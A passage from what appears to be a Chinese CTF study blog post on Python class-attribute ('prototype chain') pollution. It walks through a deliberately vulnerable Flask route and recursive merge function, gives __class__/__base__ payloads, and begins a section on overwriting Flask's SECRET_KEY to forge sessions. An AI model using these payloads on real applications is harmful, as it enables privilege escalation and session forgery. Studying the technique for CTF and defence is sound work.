@@ -1,0 +1,756 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="python原型链污染" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+
+
+
+  <title>
+python原型链污染 - 学习笔记 - ciscn2024 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">python原型链污染
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2025-05-14 15:42:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2025-05-14T15:42:34+08:00">2025-05-14</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?174270"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?933268"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?979102"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?50941"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?468770"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?793051"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/ciscn2024/" itemprop="item" rel="index" title="In ciscn2024"><span itemprop="name">ciscn2024</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/ciscn2024/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 学习笔记"><span itemprop="name">学习笔记</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="python原型链污染"><a class="anchor" href="#python原型链污染">#</a> python 原型链污染</h2>
+<h3 id="py原型链污染基础原理"><a class="anchor" href="#py原型链污染基础原理">#</a> py 原型链污染基础原理：</h3>
+<p><strong>（Python 则是对类属性值的污染）</strong></p>
+<pre><code>Python原型链污染是一种通过修改对象原型链中的属性，导致程序行为偏离预期的攻击技术。其核心原理与JavaScript原型链污染类似，但实现方式因语言特性而有所差异。
+
+*****Python则是对类属性值的污染
+
+​​原型继承特性​​
+Python中每个对象通过__class__属性指向其所属类，类通过__base__属性指向父类。当访问对象属性时，若当前对象/类中未定义，会沿原型链向上查找14。
+​​污染条件​​
+需要存在递归合并函数（如merge）且未对特殊属性过滤
+</code></pre>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    is_admin <span class="token operator">=</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">set_config</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token builtin">setattr</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_config</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>instance<span class="token operator">=</span>Config<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span>     <span class="token comment">#False</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token builtin">setattr</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span><span class="token string">'True'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span>     <span class="token comment">#True</span></pre></td></tr></table></figure><p>这是一个实例化的对象，我在 setattr 函数后面讲 is_admin 改成 True，这个只是在这个对象中实现了管理员，如果可以的话，将所有实例化的对象都改成 True 更好，我们可以通过一个例子来了解一下：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    is_admin <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 默认用户不是管理员</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">set_config</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token builtin">setattr</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_config</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/update_config'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">update_config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>json</pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> data<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        Config<span class="token punctuation">.</span>set_config<span class="token punctuation">(</span>Config<span class="token punctuation">,</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"success"</span><span class="token punctuation">,</span> <span class="token string">"config"</span><span class="token punctuation">:</span> data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/check_admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">check_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    is_admin <span class="token operator">=</span> Config<span class="token punctuation">.</span>get_config<span class="token punctuation">(</span>Config<span class="token punctuation">,</span><span class="token string">'is_admin'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"is_admin"</span><span class="token punctuation">:</span> is_admin<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>这里有两个路由：<br />
+一个设置 config 对象的 update_config 路由，一个是检查 is_admin 是不是 True 的路由</p>
+<p>先设置值</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141635152.png" alt="image-20250514163528951" /></p>
+<p>然后再检查</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141636118.png" alt="image-20250514163604047" /></p>
+<p>发现是可以修改对象的</p>
+<p>我修改的是类对象，不是实例化的东西，相当于我直接将那个类里面的 is_admin=False 改成了 is_admin=True</p>
+<p>但是一般实战中更经常看到的是 merge 的合并函数：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">father</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    secret <span class="token operator">=</span> <span class="token string">"hello"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">son_a</span><span class="token punctuation">(</span>father<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">son_b</span><span class="token punctuation">(</span>father<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v</pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>instance <span class="token operator">=</span> son_b<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token string">"__class__"</span> <span class="token punctuation">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token string">"__base__"</span> <span class="token punctuation">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token string">"secret"</span> <span class="token punctuation">:</span> <span class="token string">"world"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>son_a<span class="token punctuation">.</span>secret<span class="token punctuation">)</span><span class="token comment">#hello</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>secret<span class="token punctuation">)</span><span class="token comment">#hello</span></pre></td></tr><tr><td data-num="28"></td><td><pre>merge<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> instance<span class="token punctuation">)</span><span class="token comment">#hello</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>son_a<span class="token punctuation">.</span>secret<span class="token punctuation">)</span><span class="token comment">#hello</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>secret<span class="token punctuation">)</span><span class="token comment">#hello</span></pre></td></tr></table></figure><p>难理解的就是</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#k 和 v 都是 src 的内容，即 k 是键，v 是值</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#hassttr 函数是确定 dst 是否含有__getitem__这个属性</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v</pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#getattr 是获取这个属性</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span></pre></td></tr></table></figure><p>第一次迭代是将 payload 和 instance 传进 merge，k 和 v 是键值对</p>
+<pre><code>k=__class__
+v=&#123;'__base__': &#123;'secret': 'world'&#125;&#125;
+
+</code></pre>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141656211.png" alt="image-20250514165644020" /></p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141656046.png" alt="image-20250514165649933" /></p>
+<pre><code>没有这个__getitem__属性直接往下走
+</code></pre>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141657538.png" alt="image-20250514165744465" /></p>
+<p>到这里</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141658411.png" alt="image-20250514165817352" /></p>
+<p>dst 还是 son_b 类（实例化的）</p>
+<pre><code>所有类都有__class__属性
+原因如下：
+每个 Python 对象都有一个特殊的 __class__ 属性，这是 Python 内部用来表示对象的 类 的机制。这个属性是 Python 对象模型的一部分，它帮助解释和理解对象是如何与类关联的。
+
+__class__ 的作用
+__class__ 是一个 指向类的引用，它表示一个对象是哪个类的实例。通过它，我们可以获取一个对象的类型（即它所属的类）。所有的对象，包括实例和类本身，都有这个属性。
+</code></pre>
+<p>所以往下到</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#getattr 是获取这个属性</span></pre></td></tr></table></figure><pre><code>merge(v, getattr(dst, k))#getattr是获取这个属性
+</code></pre>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141701383.png" alt="image-20250514170117314" /></p>
+<p>就成了：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>merge<span class="token punctuation">(</span><span class="token string">"&#123;'__base__': &#123;'secret': 'world'&#125;&#125;"</span><span class="token punctuation">,</span>son_b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>为什么不是__class__，因为__class__就是指向它本身</pre></td></tr></table></figure><pre><code>第二次迭代，依旧没有__getitem__属性
+</code></pre>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141706254.png" alt="image-20250514170605187" /></p>
+<pre><code>son_b.__base__==father这个是类的继承链
+所以son_b是由这个属性的
+type(son_b)也不用说，属性字典
+</code></pre>
+<p>所以执行这行代码</p>
+<p>第三次迭代：<br />
+<img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141709321.png" alt="image-20250514170906252" /></p>
+<pre><code>        elif hasattr(dst, k) and type(v) == dict:
+一样有secret这个属性，但是v不再是字典了
+</code></pre>
+<pre><code>            setattr(dst, k, v)
+</code></pre>
+<p>执行这条语句</p>
+<pre><code>setattr(father, &quot;secret&quot;, &quot;world&quot;)  
+</code></pre>
+<p>至此污染成功</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141710757.png" alt="image-20250514171059688" /></p>
+<h3 id=""><a class="anchor" href="#">#</a> </h3>
+<h3 id="利用关键信息替换"><a class="anchor" href="#利用关键信息替换">#</a> 利用：关键信息替换</h3>
+<h4 id="flask密钥替换"><a class="anchor" href="#flask密钥替换">#</a> flask 密钥替换：</h4>
+<pre><code>如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为secret_key是在当前入口文件下面的，所以我们可以直接通过`__init__.__globals__`获取全局变量，然后通过app.config[&quot;SECRET_KEY&quot;]来进行污染
+</code></pre>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment"># Recursive merge function</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v</pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token 